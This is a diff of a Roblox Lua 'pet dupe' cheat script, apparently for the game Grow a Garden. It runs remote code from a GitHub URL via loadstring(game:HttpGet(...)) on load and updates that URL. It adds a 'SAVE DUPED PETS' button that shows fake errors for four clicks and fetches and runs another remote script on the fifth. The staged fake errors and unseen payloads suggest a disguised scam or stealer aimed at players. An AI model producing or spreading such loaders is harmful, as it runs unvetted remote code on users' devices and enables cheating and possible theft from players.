@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/privatescript"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/privatescript.ver2"))()
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
@@ -37,14 +37,19 @@ RunService.RenderStepped:Connect(function()
 	end
 end)
 
--- Dupe Amount Input (強制エラー化)
+-- Dupe Amount Input（通常動作に戻す）
 local dupeAmount = 1
 MainTab:CreateInput({
 	Name = "Dupe Amount (1-100)",
 	PlaceholderText = "Enter a number",
 	RemoveTextAfterFocusLost = false,
 	Callback = function(text)
-		error("The input is invalid. All values ​​are rejected.")
+		local number = tonumber(text)
+		if number and number >= 1 and number <= 100 then
+			dupeAmount = number
+		else
+			warn("Enter a number between 1 and 100")
+		end
 	end
 })
 
@@ -65,15 +70,22 @@ MainTab:CreateButton({
 	end
 })
 
--- Save Duped Pets Button
+-- SAVE DUPED PETS Button (5回目で実行)
+local saveAttemptCount = 0
 MainTab:CreateButton({
 	Name = "SAVE DUPED PETS",
 	Callback = function()
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
-		end)
-		if not success then
-			warn("SAVE DUPED PETS failed:", err)
+		saveAttemptCount += 1
+
+		if saveAttemptCount < 5 then
+			warn("SAVE DUPED PETS エラー: 試行 " .. saveAttemptCount .. " / 5")
+		else
+			local success, err = pcall(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
+			end)
+			if not success then
+				warn("SAVE DUPED PETS 実行失敗:", err)
+			end
 		end
 	end
 })
